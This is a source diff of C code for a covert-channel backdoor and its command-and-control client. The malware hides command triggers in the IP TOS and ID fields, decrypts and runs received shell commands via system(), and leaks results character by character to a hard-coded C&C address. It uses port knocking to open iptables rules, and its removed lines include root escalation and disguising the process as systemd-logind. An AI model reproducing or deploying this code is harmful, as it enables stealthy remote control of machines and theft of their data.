@@ -1,59 +1,25 @@
 #include "main.h"
 
-#define FILTER "tcp and port 8505"
-#define PAYLOAD_KEY "8505"
-#define PORT "8505"
-#define SHPORT 8505
-#define SPORT 22
-#define BUFFERSIZE 1024
-#define MASK "/usr/lib/systemd/systemd-logind"
-#define CMD "./cmd.sh > results"
-#define CHMOD "chmod 755 cmd.sh"
-#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
-#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
-#define RESULT_FILE "results"
-#define INFECTEDIP "192.168.1.13"
-#define CNCIP "192.168.1.3"
-
-struct payload{
-    char key[5]; // always 8505
-    char buffer[1024]; // for either commands or results
-};
-
-
-int Packetcapture();
-void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParsePayload(const u_char *payload, int len);
-void CreatePayload(char *command, unsigned char *encrypted);
-void SendPayload(const unsigned char *tcp_payload);
-bool CheckKey(u_char ip_tos, u_short ip_id);
-void recv_results(char* sip, unsigned short sport);
-void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
-int rand_delay(int delay);
-
 int main(int argc, char **argv){
-    //strcpy(argv[0], MASK);
-    //change the UID/GID to 0 to raise privs
-    setuid(0);
-    setgid(0);
     char *c = "c";
     char *sip = CNCIP;
     char *dip = INFECTEDIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE] = "ls";
-
-    if(strcmp(argv[1],c) == 0){
-        covert_send(sip, dip, sport, dport, data, 0);
-        recv_results(dip, dport);
-
-        exit(1);
-    } else {
-        Packetcapture();
+    unsigned char data[BUFSIZE];
+    if(argc < 2){
+        printf("Usage ./cnc [command]\n");
+	exit(1);
     }
-
+	strcpy(data, argv[1]);
+	pattern[0] = 14881; //port 8506 in u_short
+	pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
+	knocking[0] = 0; // initilizing the knocking
+	knocking[1] = 0;
+	printf("command: %s", data);
+	covert_send(sip, dip, sport, dport, data, 0);
+	Packetcapture();
+    exit(1);
     return 0;
 }
 
@@ -61,7 +27,6 @@ int Packetcapture(){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
-    pcap_t* interfaceinfo;
     bpf_u_int32 netp; //holds the ip
 
     //find the first network device capable of packet capture
@@ -132,9 +97,11 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
-        if(CheckKey(ip->ip_tos, ip->ip_id)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             printf("Reading payload\n");
             ParseTCP(args, pkthdr, packet);
+        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
+            ParsePattern(args,pkthdr, packet);
         } else {
             printf("Packet tossed wrong key\n");
         }
@@ -142,11 +109,67 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
 
 }
 
-bool CheckKey(u_char ip_tos, u_short ip_id){
-    if(ip_tos == 'l' && ip_id == 'b'){
-        return true;
+bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
+    if(knock){
+        //check if the key is right for port knocking
+        if(ip_tos == 'b' && ip_id == 'l'){
+            return true;
+        } else {
+            return false;
+        }
     } else {
-        return false;
+        // check if key is right for normal packets
+        if(ip_tos == 'l' && ip_id == 'b'){
+            return true;
+        } else {
+            return false;
+        }
+    }
+}
+
+void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+    const struct sniff_tcp *tcp=0;
+    const struct my_ip *ip;
+    const char *payload;
+
+    int size_ip;
+    int size_tcp;
+    int size_payload;
+
+    printf("TCP Packet\n");
+
+    ip = (struct my_ip*)(packet + 14);
+    size_ip = IP_HL(ip)*4;
+
+    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
+    size_tcp = TH_OFF(tcp)*4;
+
+    if(size_tcp < 20){
+        perror("TCP: Control packet length is incorrect");
+        exit(1);
+    }
+
+    printf("Source port: %d\n", ntohs(tcp->th_sport));
+    printf("Destination port: %d\n", ntohs(tcp->th_dport));
+    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
+
+    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+
+    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
+    for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
+        if(pattern[k] == tcp->th_dport){
+            knocking[k] = 1;
+        }
+    }
+    if((knocking[0] == 1) && (knocking[1] == 1)){
+        system(IPTABLES(INFECTEDIP));
+        char *dip = INFECTEDIP;
+        unsigned short sport = SHPORT;
+        unsigned short dport = SHPORT;
+        printf("WAITING FOR DATA\n");
+        recv_results(dip, dport, RESULT_FILE);
+        system(TURNOFF(INFECTEDIP));
+        pcap_breakloop(interfaceinfo);
     }
 }
 
@@ -189,7 +212,7 @@ void ParsePayload(const u_char *payload, int len){
     unsigned char decryptedtext[BUFSIZE+16];
     int decryptedlen, cipherlen;
 
-    if((fp = fopen("cmd.sh", "wb+")) < 0){
+    if((fp = fopen(FILENAME, "wb+")) < 0){
         perror("fopen");
         exit(1);
     }
@@ -207,7 +230,7 @@ void ParsePayload(const u_char *payload, int len){
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES);
+    system(IPTABLES(INFECTEDIP));
 
 
     //sending the results back to the CNC
@@ -217,68 +240,6 @@ void ParsePayload(const u_char *payload, int len){
     unsigned short dport = SHPORT;
 
     send_results(srcip, destip, sport, dport, RESULT_FILE);
-    system(TURNOFF);
+    system(TURNOFF(INFECTEDIP));
 }
 
-void recv_results(char* sip, unsigned short sport) {
-    FILE* file;
-    char input;
-
-    printf("listening for results\n\n");
-
-    if((file = fopen(RESULT_FILE, "wb")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-
-    while(1) {
-        input = covert_recv(sip, sport, 1, 0, 0, 0);
-        if(input != 0) {
-            printf("Output: %c\n", input);
-            fprintf(file, "%c", input);
-            fflush(file);
-        } else if (input == EOF){
-            return;
-        }
-    }
-}
-
-void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename) {
-    FILE *file;
-    char input;
-    clock_t start;
-    int timer_complete =0, delay  = 0;
-    int max_delay = 1;
-    double passed;
-
-    if((file = fopen(filename, "rb")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-
-    while((input = fgetc(file)) != EOF) {
-        printf("Character to send: %d\n", input);
-        covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
-        start = clock();    //start of clock
-        timer_complete = 0;    //reset the timer again
-        delay = rand_delay(max_delay);
-        printf("delay: %d\n", delay);
-
-        //wait for the timer to complete
-        while(timer_complete == 0) {
-            passed = (clock() - start) / CLOCKS_PER_SEC;
-            if(passed >= delay) {
-                printf("Delay completed\n");
-                timer_complete = 1;
-            }
-        }
-    }
-
-    printf("completed\n");
-    fclose(file);
-}
-
-
-int rand_delay(int delay) {
-    return rand() % delay + 1;
-}
